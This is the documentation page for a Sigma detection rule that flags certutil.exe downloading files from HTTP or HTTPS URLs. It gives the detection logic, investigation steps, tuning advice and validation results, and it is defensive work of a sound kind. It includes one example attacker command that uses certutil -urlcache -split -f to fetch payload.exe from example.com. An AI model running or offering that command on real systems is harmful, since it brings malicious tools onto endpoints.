# Certutil Remote File Download

## Rule Status

Experimental - validated with Sigma CLI 3.1.0.

## Threat Scenario

Certutil is a legitimate Microsoft Windows command-line utility used to manage certificates, certificate authorities, and certificate stores.

An attacker may abuse `certutil.exe` to download malicious files from a remote HTTP or HTTPS location. Because Certutil is a trusted Windows binary, its execution may appear less suspicious than an unknown downloader and may bypass basic application-control restrictions.

Example suspicious command:

```text
certutil.exe -urlcache -split -f https://example.com/payload.exe payload.exe
```

This behaviour may be used to transfer malware, scripts, tools, or additional attack components onto a compromised endpoint.

## Detection Hypothesis

If Certutil executes with a remote HTTP or HTTPS URL and download-related command-line options, the activity should be investigated as possible malicious file transfer.

## Required Telemetry

Windows process-creation events containing the complete process command line.

```yaml
logsource:
  category: process_creation
  product: windows
```

Suitable telemetry includes:

- Sysmon Event ID 1.
- Windows Security Event ID 4688 with command-line auditing enabled.
- EDR process-creation telemetry.

## Detection Logic Explanation

The rule uses three required selections.

### Process Selection

```yaml
selection_image:
  - Image|endswith: '\certutil.exe'
  - OriginalFileName: CertUtil.exe
```

This confirms that the executed process is Certutil.

Checking both `Image` and `OriginalFileName` improves coverage when:

- Certutil executes from its standard Windows location.
- The executable path uses different capitalisation.
- A copied or renamed executable retains its original filename metadata.

### Remote URL Selection

```yaml
selection_url:
  CommandLine|contains:
    - 'http://'
    - 'https://'
```

This identifies Certutil commands that reference a remote web location.

Normal certificate inspection performed entirely against local files will not satisfy this selection.

### Download Option Selection

```yaml
selection_download:
  CommandLine|contains:
    - '-urlcache'
    - '-split'
    - '-f'
```

These options are commonly present when Certutil retrieves or writes remote content:

- `-urlcache` interacts with URL cache entries and can retrieve remote content.
- `-split` allows retrieved content to be written as separate output.
- `-f` forces the requested operation or overwrites existing output.

### Final Condition

```yaml
condition: selection_image and selection_url and selection_download
```

The rule only matches when all three behaviours are present:

1. Certutil executes.
2. The command contains an HTTP or HTTPS URL.
3. At least one download-related option is present.

This combined logic is more precise than alerting on every execution of Certutil.

## Relevant Event Fields

The following fields should be retained for investigation:

- `Image`: Executable path.
- `CommandLine`: Complete Certutil command.
- `ParentImage`: Process that launched Certutil.
- `ParentCommandLine`: Command line of the parent process.
- `User`: Account that executed the command.
- `Computer`: Affected endpoint.
- `ProcessId`: Operating-system process identifier.
- `ProcessGuid`: Unique process identifier when supplied by Sysmon.
- `Hashes`: Cryptographic hashes of the executable.

## MITRE ATT&CK Mapping

- **T1105 — Ingress Tool Transfer:** Certutil can be abused to transfer files from an external location onto a compromised endpoint.

## False Positives

Potential legitimate activity includes:

- Certificate administrators retrieving approved certificate files.
- Software-deployment systems downloading trusted resources.
- Enterprise scripts using Certutil against internal PKI infrastructure.
- Security testing performed by authorised personnel.
- Approved troubleshooting involving trusted Microsoft or organisational URLs.

Any allowlist should be based on verified URLs, expected parent processes, authorised users, and managed endpoints.

## Investigation Notes

When the rule triggers, the analyst should:

1. Identify the user and endpoint that executed Certutil.
2. Review the complete command line and remote URL.
3. Determine whether the domain is internal, trusted, newly registered, or previously associated with malicious activity.
4. Identify the destination filename and path.
5. Calculate and investigate the downloaded file's hashes.
6. Check whether the file was subsequently executed.
7. Review the parent process that launched Certutil.
8. Look for related PowerShell, command-shell, scripting-engine, or LOLBin activity.
9. Review network connections to the remote host.
10. Search other endpoints for the same URL, filename, hash, or command pattern.
11. Isolate the endpoint if malicious activity is confirmed.

Particularly suspicious parent processes include:

- Microsoft Office applications.
- Web browsers followed by command-shell execution.
- Script interpreters.
- Unexpected service processes.
- Processes running from temporary or user-writable directories.

## Tuning Recommendations

Organisations may tune the rule by:

- Allowlisting approved internal PKI domains.
- Allowlisting known certificate-management servers.
- Restricting trusted administrator accounts and management systems.
- Increasing severity when the destination is a temporary or user-writable directory.
- Increasing severity when Certutil is launched by an Office application or scripting engine.
- Correlating the alert with subsequent process execution or network activity.
- Enriching remote domains and downloaded-file hashes with threat intelligence.

Avoid broad exclusions based only on the Certutil executable because attackers abuse the legitimate Windows binary.

## Validation Results

The rule was validated using:

```text
Sigma CLI version 3.1.0
```

Validation command:

```powershell
sigma check rules\lolbins\certutil_remote_file_download.yml
```

Result:

```text
Found 0 errors, 0 condition errors and 0 issues.
No rule errors found.
No condition errors found.
No validation issues found.
```

Validation date: 25 July 2026.

## Limitations

- The rule requires process-creation telemetry with the complete command line.
- It does not confirm that the remote file was downloaded successfully.
- Alternative Certutil syntax may not contain the selected options.
- An attacker could use another Windows utility or scripting language for file transfer.
- The rule does not independently determine whether the remote URL or downloaded file is malicious.
- Additional file-creation, network, and process telemetry is required to confirm the complete activity.

## References

- [Microsoft — Tools to Create, View, and Manage Certificates](https://learn.microsoft.com/en-us/windows/win32/seccrypto/tools-to-create-view-and-manage-certificates)
- [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)